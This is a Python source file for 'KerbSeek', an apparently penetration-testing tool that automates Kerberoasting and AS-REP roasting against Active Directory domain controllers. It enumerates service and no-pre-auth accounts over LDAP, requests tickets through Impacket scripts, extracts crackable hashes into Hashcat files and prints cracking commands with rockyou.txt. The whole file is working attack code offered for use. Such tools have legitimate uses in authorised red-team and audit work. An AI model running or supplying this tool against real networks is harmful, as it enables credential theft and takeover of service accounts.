#!/usr/bin/env python3
"""
KerbSeek v1.0 - Kerberos Attack Discovery Tool
Automated Kerberoasting and ASREPRoasting

Features:
- Kerberoasting: Request TGS tickets for accounts with SPNs
- ASREPRoasting: Request AS-REP for accounts without pre-auth
- Ticket extraction and hash formatting
- Integration with Hashcat/John formats
- Ticket encryption analysis (RC4 vs AES)
- Automatic hash cracking preparation
- Domain trust enumeration

Usage:
    ./kerbseek.py --spns users.txt             # Kerberoast specific users
    ./kerbseek.py --asrep users.txt            # ASREPRoast specific users
    ./kerbseek.py --auto dclist.txt            # Auto-discover and attack
    ./kerbseek.py --domain DOMAIN -u user -p pass --kerberoast
    
Output:
    kerblist.txt        - Vulnerable accounts found
    tgs_hashes.txt      - Kerberoasting hashes (Hashcat format)
    asrep_hashes.txt    - ASREPRoast hashes (Hashcat format)
    tickets.txt         - Raw ticket data
    kerb_details.txt    - Detailed findings
    kerb_details.json   - JSON export
"""

import socket
import subprocess
import sys
import json
import re
import argparse
import base64
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# Import shared utilities
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
from seek_utils import find_ip_list


# Color codes
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
BLUE = '\033[94m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
RESET = '\033[0m'
BOLD = '\033[1m'

# Kerberos ports
KERBEROS_PORTS = {
    88: 'Kerberos',
    464: 'Kerberos Change/Set Password'
}

# Encryption types
ENCRYPTION_TYPES = {
    1: 'DES-CBC-CRC',
    3: 'DES-CBC-MD5',
    17: 'AES128-CTS-HMAC-SHA1-96',
    18: 'AES256-CTS-HMAC-SHA1-96',
    23: 'RC4-HMAC',
    24: 'RC4-HMAC-EXP'
}

# Banner
BANNER = f"""{CYAN}{BOLD}
██╗  ██╗███████╗██████╗ ██████╗ ███████╗███████╗███████╗██╗  ██╗
██║ ██╔╝██╔════╝██╔══██╗██╔══██╗██╔════╝██╔════╝██╔════╝██║ ██╔╝
█████╔╝ █████╗  ██████╔╝██████╔╝███████╗█████╗  █████╗  █████╔╝ 
██╔═██╗ ██╔══╝  ██╔══██╗██╔══██╗╚════██║██╔══╝  ██╔══╝  ██╔═██╗ 
██║  ██╗███████╗██║  ██║██████╔╝███████║███████╗███████╗██║  ██╗
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
{RESET}
{YELLOW}KerbSeek v1.0 - Kerberos Attack Discovery{RESET}
{BLUE}Automated Kerberoasting and ASREPRoasting{RESET}
"""


def print_banner():
    """Print the tool banner"""
    print(BANNER)


def read_user_list(file_path):
    """Read usernames from a file"""
    users = []
    try:
        with open(file_path, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    users.append(line)
    except Exception as e:
        print(f"{RED}[!] Error reading file {file_path}: {e}{RESET}")
    return users


def check_kerberos_port(dc_ip, port=88, timeout=3):
    """Check if Kerberos port is open"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((dc_ip, port))
        sock.close()
        return result == 0
    except:
        return False


def get_domain_from_dc(dc_ip, timeout=10):
    """
    Get domain name from DC using ldapsearch
    Returns: domain name
    """
    try:
        cmd = ['ldapsearch', '-x', '-H', f'ldap://{dc_ip}',
               '-b', '', '-s', 'base', 'defaultNamingContext']
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        
        if result.returncode == 0:
            for line in result.stdout.split('\n'):
                if 'defaultNamingContext:' in line:
                    naming_context = line.split(':', 1)[1].strip()
                    dc_parts = [part.split('=')[1] for part in naming_context.split(',') if part.startswith('DC=')]
                    return '.'.join(dc_parts)
    except:
        pass
    return None


def request_tgs_ticket_impacket(domain, username, spn, dc_ip=None, user_for_auth=None, password=None, timeout=30):
    """
    Request TGS ticket using Impacket's GetUserSPNs.py
    Returns: dict with ticket info
    """
    result = {
        'username': username,
        'spn': spn,
        'hash': None,
        'encryption': None,
        'success': False
    }
    
    try:
        # Build GetUserSPNs.py command
        if user_for_auth and password:
            # Authenticated request
            cmd = ['GetUserSPNs.py', '-request', '-dc-ip', dc_ip,
                   f'{domain}/{user_for_auth}:{password}',
                   '-outputfile', f'tgs_{username}.txt']
        else:
            # Unauthenticated (usually won't work, but try)
            cmd = ['GetUserSPNs.py', '-request', '-no-pass', '-dc-ip', dc_ip,
                   f'{domain}/{username}']
        
        proc_result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        
        if proc_result.returncode == 0 or 'krb5tgs' in proc_result.stdout.lower():
            # Parse output for hash
            output = proc_result.stdout + proc_result.stderr
            
            # Look for Kerberos 5 TGS-REP hash
            hash_pattern = r'\$krb5tgs\$23\$[^\s]+'
            match = re.search(hash_pattern, output)
            
            if match:
                result['hash'] = match.group(0)
                result['success'] = True
                
                # Determine encryption type
                if '$23$' in result['hash']:
                    result['encryption'] = 'RC4-HMAC'
                elif '$17$' in result['hash']:
                    result['encryption'] = 'AES128'
                elif '$18$' in result['hash']:
                    result['encryption'] = 'AES256'
    
    except subprocess.TimeoutExpired:
        result['error'] = 'Timeout'
    except FileNotFoundError:
        result['error'] = 'GetUserSPNs.py not found (install impacket-scripts)'
    except Exception as e:
        result['error'] = str(e)
    
    return result


def request_asrep_ticket_impacket(domain, username, dc_ip=None, timeout=30):
    """
    Request AS-REP ticket using Impacket's GetNPUsers.py
    Returns: dict with ticket info
    """
    result = {
        'username': username,
        'hash': None,
        'encryption': None,
        'success': False
    }
    
    try:
        # Build GetNPUsers.py command
        cmd = ['GetNPUsers.py', domain + '/', '-usersfile', '-',
               '-format', 'hashcat', '-dc-ip', dc_ip, '-no-pass']
        
        # Pass username via stdin
        proc_result = subprocess.run(cmd, input=username, capture_output=True, 
                                    text=True, timeout=timeout)
        
        if proc_result.returncode == 0 or 'krb5asrep' in proc_result.stdout.lower():
            output = proc_result.stdout + proc_result.stderr
            
            # Look for Kerberos 5 AS-REP hash
            hash_pattern = r'\$krb5asrep\$23\$[^\s]+'
            match = re.search(hash_pattern, output)
            
            if match:
                result['hash'] = match.group(0)
                result['success'] = True
                result['encryption'] = 'RC4-HMAC' if '$23$' in result['hash'] else 'Unknown'
    
    except subprocess.TimeoutExpired:
        result['error'] = 'Timeout'
    except FileNotFoundError:
        result['error'] = 'GetNPUsers.py not found (install impacket-scripts)'
    except Exception as e:
        result['error'] = str(e)
    
    return result


def kerberoast_user(username, spn, domain, dc_ip, args):
    """
    Attempt to Kerberoast a single user
    Returns: dict with result
    """
    result = {
        'username': username,
        'spn': spn,
        'attack_type': 'kerberoast',
        'hash': None,
        'encryption': None,
        'status': 'failed'
    }
    
    try:
        ticket_result = request_tgs_ticket_impacket(
            domain, username, spn, dc_ip,
            args.username, args.password,
            timeout=args.timeout
        )
        
        if ticket_result['success']:
            result['hash'] = ticket_result['hash']
            result['encryption'] = ticket_result['encryption']
            result['status'] = 'success'
    
    except Exception as e:
        result['error'] = str(e)
    
    return result


def asreproast_user(username, domain, dc_ip, args):
    """
    Attempt to ASREPRoast a single user
    Returns: dict with result
    """
    result = {
        'username': username,
        'attack_type': 'asreproast',
        'hash': None,
        'encryption': None,
        'status': 'failed'
    }
    
    try:
        ticket_result = request_asrep_ticket_impacket(
            domain, username, dc_ip, timeout=args.timeout
        )
        
        if ticket_result['success']:
            result['hash'] = ticket_result['hash']
            result['encryption'] = ticket_result['encryption']
            result['status'] = 'success'
    
    except Exception as e:
        result['error'] = str(e)
    
    return result


def auto_discover_and_attack(dc_ip, args):
    """
    Auto-discover vulnerable accounts and attack them
    Requires ldapsearch for enumeration
    """
    results = []
    
    try:
        # Get domain name
        domain = get_domain_from_dc(dc_ip, timeout=args.timeout)
        if not domain:
            print(f"{RED}[!] Could not determine domain from {dc_ip}{RESET}")
            return results
        
        print(f"{CYAN}[*] Domain: {domain}{RESET}")
        
        # Get naming context
        cmd = ['ldapsearch', '-x', '-H', f'ldap://{dc_ip}',
               '-b', '', '-s', 'base', 'defaultNamingContext']
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=args.timeout)
        
        naming_context = None
        for line in result.stdout.split('\n'):
            if 'defaultNamingContext:' in line:
                naming_context = line.split(':', 1)[1].strip()
                break
        
        if not naming_context:
            print(f"{RED}[!] Could not get naming context{RESET}")
            return results
        
        # Enumerate users with SPNs (Kerberoastable)
        if args.kerberoast or args.auto:
            print(f"{CYAN}[*] Enumerating Kerberoastable accounts...{RESET}")
            
            ldap_filter = '(&(objectClass=user)(objectCategory=person)(servicePrincipalName=*))'
            cmd = ['ldapsearch', '-x', '-H', f'ldap://{dc_ip}',
                   '-b', naming_context, ldap_filter,
                   'sAMAccountName', 'servicePrincipalName']
            
            if args.username and args.password:
                cmd[2:2] = ['-D', args.username, '-w', args.password]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=args.timeout*2)
            
            current_user = None
            current_spns = []
            
            for line in result.stdout.split('\n'):
                if line.startswith('sAMAccountName:'):
                    if current_user and current_spns:
                        # Kerberoast this user
                        for spn in current_spns:
                            kerb_result = kerberoast_user(current_user, spn, domain, dc_ip, args)
                            if kerb_result['status'] == 'success':
                                results.append(kerb_result)
                                print(f"{GREEN}[+]{RESET} Kerberoasted: {current_user}")
                                break
                    
                    current_user = line.split(':', 1)[1].strip()
                    current_spns = []
                
                elif line.startswith('servicePrincipalName:'):
                    spn = line.split(':', 1)[1].strip()
                    current_spns.append(spn)
            
            # Don't forget the last user
            if current_user and current_spns:
                for spn in current_spns:
                    kerb_result = kerberoast_user(current_user, spn, domain, dc_ip, args)
                    if kerb_result['status'] == 'success':
                        results.append(kerb_result)
                        print(f"{GREEN}[+]{RESET} Kerberoasted: {current_user}")
                        break
        
        # Enumerate users without pre-auth (ASREPRoastable)
        if args.asreproast or args.auto:
            print(f"{CYAN}[*] Enumerating ASREPRoastable accounts...{RESET}")
            
            ldap_filter = '(&(objectClass=user)(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
            cmd = ['ldapsearch', '-x', '-H', f'ldap://{dc_ip}',
                   '-b', naming_context, ldap_filter, 'sAMAccountName']
            
            if args.username and args.password:
                cmd[2:2] = ['-D', args.username, '-w', args.password]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=args.timeout*2)
            
            for line in result.stdout.split('\n'):
                if line.startswith('sAMAccountName:'):
                    username = line.split(':', 1)[1].strip()
                    
                    asrep_result = asreproast_user(username, domain, dc_ip, args)
                    if asrep_result['status'] == 'success':
                        results.append(asrep_result)
                        print(f"{GREEN}[+]{RESET} ASREPRoasted: {username}")
    
    except Exception as e:
        print(f"{RED}[!] Error during auto-discovery: {e}{RESET}")
    
    return results


def save_kerblist(results, filename='kerblist.txt'):
    """Save list of vulnerable accounts"""
    try:
        with open(filename, 'w') as f:
            for result in results:
                if result['status'] == 'success':
                    f.write(f"{result['username']}\n")
        print(f"{GREEN}[+] Vulnerable account list saved to: {filename}{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error saving account list: {e}{RESET}")


def save_tgs_hashes(results, filename='tgs_hashes.txt'):
    """Save Kerberoasting hashes (Hashcat format)"""
    try:
        with open(filename, 'w') as f:
            for result in results:
                if result['status'] == 'success' and result['attack_type'] == 'kerberoast':
                    if result['hash']:
                        f.write(f"{result['hash']}\n")
        print(f"{GREEN}[+] TGS hashes saved to: {filename} (Hashcat mode 13100){RESET}")
    except Exception as e:
        print(f"{RED}[!] Error saving TGS hashes: {e}{RESET}")


def save_asrep_hashes(results, filename='asrep_hashes.txt'):
    """Save ASREPRoast hashes (Hashcat format)"""
    try:
        with open(filename, 'w') as f:
            for result in results:
                if result['status'] == 'success' and result['attack_type'] == 'asreproast':
                    if result['hash']:
                        f.write(f"{result['hash']}\n")
        print(f"{GREEN}[+] AS-REP hashes saved to: {filename} (Hashcat mode 18200){RESET}")
    except Exception as e:
        print(f"{RED}[!] Error saving AS-REP hashes: {e}{RESET}")


def save_details(results, filename='kerb_details.txt'):
    """Save detailed results"""
    try:
        with open(filename, 'w') as f:
            f.write("=" * 80 + "\n")
            f.write("KERBSEEK - Kerberos Attack Results\n")
            f.write(f"Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 80 + "\n\n")
            
            kerb_count = len([r for r in results if r['attack_type'] == 'kerberoast' and r['status'] == 'success'])
            asrep_count = len([r for r in results if r['attack_type'] == 'asreproast' and r['status'] == 'success'])
            
            f.write(f"Kerberoasting successes: {kerb_count}\n")
            f.write(f"ASREPRoasting successes: {asrep_count}\n\n")
            
            for result in results:
                if result['status'] == 'success':
                    f.write(f"\n{'=' * 80}\n")
                    f.write(f"Attack Type: {result['attack_type'].upper()}\n")
                    f.write(f"Username: {result['username']}\n")
                    if 'spn' in result:
                        f.write(f"SPN: {result['spn']}\n")
                    f.write(f"Encryption: {result.get('encryption', 'Unknown')}\n")
                    f.write(f"Hash: {result.get('hash', 'N/A')[:100]}...\n")
                    
                    # Cracking instructions
                    if result['attack_type'] == 'kerberoast':
                        f.write(f"\nCrack with Hashcat:\n")
                        f.write(f"  hashcat -m 13100 tgs_hashes.txt wordlist.txt\n")
                    else:
                        f.write(f"\nCrack with Hashcat:\n")
                        f.write(f"  hashcat -m 18200 asrep_hashes.txt wordlist.txt\n")
        
        print(f"{GREEN}[+] Detailed results saved to: {filename}{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error saving details: {e}{RESET}")


def save_json(results, filename='kerb_details.json'):
    """Save results as JSON"""
    try:
        with open(filename, 'w') as f:
            json.dump(results, f, indent=2)
        print(f"{GREEN}[+] JSON results saved to: {filename}{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error saving JSON: {e}{RESET}")


def main():
    parser = argparse.ArgumentParser(
        description='KerbSeek - Kerberos Attack Discovery',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Auto-discover and attack
  ./kerbseek.py --auto dclist.txt -u user@domain.com -p pass
  
  # Kerberoast specific users
  ./kerbseek.py --kerberoast --spns spn_users.txt -d domain.com --dc 10.0.0.1
  
  # ASREPRoast specific users
  ./kerbseek.py --asreproast --users asrep_users.txt -d domain.com --dc 10.0.0.1
  
  # Crack hashes
  hashcat -m 13100 tgs_hashes.txt rockyou.txt     # Kerberoasting
  hashcat -m 18200 asrep_hashes.txt rockyou.txt   # ASREPRoasting
        """
    )
    
    parser.add_argument('--auto', action='store_true', help='Auto-discover and attack (requires DC IP)')
    parser.add_argument('--kerberoast', action='store_true', help='Kerberoasting mode')
    parser.add_argument('--asreproast', action='store_true', help='ASREPRoasting mode')
    parser.add_argument('--spns', help='File with usernames that have SPNs')
    parser.add_argument('--users', help='File with usernames for ASREPRoasting')
    parser.add_argument('-d', '--domain', help='Domain name (e.g., contoso.com)')
    parser.add_argument('--dc', help='Domain Controller IP address')
    parser.add_argument('input_file', nargs='?', help='DC list file (for --auto mode)')
    parser.add_argument('-u', '--username', help='Username for authenticated requests (user@domain)')
    parser.add_argument('-p', '--password', help='Password for authenticated requests')
    parser.add_argument('-t', '--timeout', type=int, default=30, help='Timeout in seconds (default: 30)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    print_banner()
    
    # Validate arguments
    if args.auto:
        if not args.input_file:
            print(f"{RED}[!] --auto requires DC list file{RESET}")
            parser.print_help()
            sys.exit(1)
    elif args.kerberoast:
        if not args.spns or not args.domain or not args.dc:
            print(f"{RED}[!] --kerberoast requires --spns, --domain, and --dc{RESET}")
            parser.print_help()
            sys.exit(1)
    elif args.asreproast:
        if not args.users or not args.domain or not args.dc:
            print(f"{RED}[!] --asreproast requires --users, --domain, and --dc{RESET}")
            parser.print_help()
            sys.exit(1)
    else:
        parser.print_help()
        sys.exit(1)
    
    results = []
    
    try:
        if args.auto:
            # Auto-discovery mode
            dc_ips = read_user_list(args.input_file)
            
            print(f"{CYAN}[*] Starting auto-discovery mode...{RESET}")
            print(f"{CYAN}[*] Domain Controllers: {len(dc_ips)}{RESET}\n")
            
            for dc_ip in dc_ips:
                if check_kerberos_port(dc_ip, timeout=args.timeout):
                    print(f"{BLUE}[*]{RESET} Attacking {dc_ip}...")
                    dc_results = auto_discover_and_attack(dc_ip, args)
                    results.extend(dc_results)
                elif args.verbose:
                    print(f"{RED}[!]{RESET} {dc_ip} - Kerberos port closed")
        
        elif args.kerberoast:
            # Kerberoasting mode
            usernames = read_user_list(args.spns)
            
            print(f"{CYAN}[*] Starting Kerberoasting...{RESET}")
            print(f"{CYAN}[*] Targets: {len(usernames)}{RESET}\n")
            
            for username in usernames:
                result = kerberoast_user(username, f'HTTP/{username}', args.domain, args.dc, args)
                results.append(result)
                
                if result['status'] == 'success':
                    print(f"{GREEN}[+]{RESET} {username} - Hash obtained")
                elif args.verbose:
                    print(f"{RED}[!]{RESET} {username} - Failed")
        
        elif args.asreproast:
            # ASREPRoasting mode
            usernames = read_user_list(args.users)
            
            print(f"{CYAN}[*] Starting ASREPRoasting...{RESET}")
            print(f"{CYAN}[*] Targets: {len(usernames)}{RESET}\n")
            
            for username in usernames:
                result = asreproast_user(username, args.domain, args.dc, args)
                results.append(result)
                
                if result['status'] == 'success':
                    print(f"{GREEN}[+]{RESET} {username} - Hash obtained")
                elif args.verbose:
                    print(f"{RED}[!]{RESET} {username} - Failed")
    
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Interrupted by user{RESET}")
    
    # Print summary
    print(f"\n{CYAN}{'=' * 80}{RESET}")
    print(f"{CYAN}Attack Complete{RESET}")
    print(f"{CYAN}{'=' * 80}{RESET}")
    
    kerb_success = len([r for r in results if r['attack_type'] == 'kerberoast' and r['status'] == 'success'])
    asrep_success = len([r for r in results if r['attack_type'] == 'asreproast' and r['status'] == 'success'])
    
    print(f"Kerberoasting successes: {kerb_success}")
    print(f"ASREPRoasting successes: {asrep_success}")
    
    # Save results
    if results:
        success_results = [r for r in results if r['status'] == 'success']
        if success_results:
            save_kerblist(success_results)
            
            if kerb_success > 0:
                save_tgs_hashes(success_results)
            
            if asrep_success > 0:
                save_asrep_hashes(success_results)
            
            save_details(success_results)
            save_json(success_results)
            
            print(f"\n{YELLOW}[*] Next steps:{RESET}")
            if kerb_success > 0:
                print(f"  hashcat -m 13100 tgs_hashes.txt rockyou.txt")
            if asrep_success > 0:
                print(f"  hashcat -m 18200 asrep_hashes.txt rockyou.txt")
    
    print(f"\n{GREEN}[+] Attack complete!{RESET}")


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Interrupted by user{RESET}")
        sys.exit(0)
